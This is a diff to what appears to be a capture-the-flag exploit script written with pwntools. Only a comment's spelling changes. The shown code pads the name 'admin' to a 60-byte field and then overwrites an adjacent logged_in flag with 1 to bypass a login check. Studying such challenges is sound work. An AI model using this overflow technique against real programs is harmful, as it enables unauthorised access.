@@ -69,7 +69,7 @@ io.sendlineafter(b"> ",b"create_doc")
 name = b"admin"
 logged_in = p32(1)
 
-# 60 because the name bloc space is 60 bytes so (60-len(name))*b"\0" is to fill the remaining
+# 60 because the name block space is 60 bytes so (60-len(name))*b"\0" is to fill the remaining
 payload = name + (60-len(name))*b"\0" + logged_in 
 log.success(f"{len(payload) = }")
 io.sendlineafter(b"> ",b"write_doc 0 " + payload)
